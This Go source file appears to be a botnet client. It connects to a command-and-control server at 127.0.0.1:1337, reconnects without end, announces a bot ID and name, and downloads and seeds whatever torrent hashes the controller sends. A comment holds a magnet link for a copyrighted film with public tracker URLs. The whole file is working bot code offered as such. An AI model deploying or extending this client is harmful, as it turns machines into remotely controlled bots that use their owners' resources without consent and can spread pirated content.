package main

import (
	"bufio"
	"fmt"
	"net"
	"net/textproto"
	"strings"

	"github.com/vincentdc94/botnet"
)

var starterPort = 50007

func main() {
	connectionHandler(false)
}

func connectionHandler(reconnect bool) {
	if reconnect {
		fmt.Println("attempting reconnect")
	}

	conn, connErr := net.Dial("tcp", "127.0.0.1:1337")

	defer connectionHandler(true)

	if connErr == nil && reconnect == true {
		fmt.Println("reconnect successful")
	}

	writer := bufio.NewWriter(conn)
	tpw := textproto.NewWriter(writer)

	reader := bufio.NewReader(conn)
	tpr := textproto.NewReader(reader)

	tpw.PrintfLine("botid::" + botnet.GetUniqueID())
	tpw.PrintfLine("botid::" + botnet.GetName())
	tpw.PrintfLine("notification::Bot " + botnet.GetName() + " with unique identifier " + botnet.GetUniqueID() + " has connected")

	for {

		message, readErr := tpr.ReadLine()

		if readErr != nil {
			fmt.Println("Error reading connection stream")
			break
		}

		//var torrentData botnet.TorrentData

		//jsonErr := json.Unmarshal([]byte(line), &torrentData)

		receivedMessage := strings.Split(message, "::")

		fmt.Printf("message received: %s\n", message)

		command := receivedMessage[0]

		if command == "torrents" {
			torrentHashes := strings.Split(receivedMessage[1], ",")

			for _, hash := range torrentHashes {
				tpw.PrintfLine("[+] Downloading and seeding torrent: " + hash)

				_, torrentErr := botnet.DoTorrent("magnet:?xt=urn:btih:"+hash, starterPort)

				if torrentErr != nil {
					fmt.Println("Error reading torrent")
				}

				starterPort++
			}

		}

		// if jsonErr != nil {
		// 	fmt.Println("Error reading json data")
		// }
		//magnet:?xt=urn:btih:QWG6DKIF4HKBWN3T6JTXE5UTNTQLNALN&dn=Snowden+(2016)+720p+BrRip+x264+YIFY&tr=udp://tracker.zer0day.to:1337/announce&tr=udp://tracker.coppersurfer.tk:6969/announce&tr=udp://mgtracker.org:6969/announce&tr=udp://tracker.leechers-paradise.org:6969/announce&tr=udp://tracker.sktorrent.net:6969/announce&tr=udp://explodie.org:6969/announce

		/*torrent, torrentErr := botnet.DoTorrent("magnet:?xt=urn:btih:"+torrentData.Hash, starterPort)*/

		//fmt.Println(torrent.Progress)

	}

}
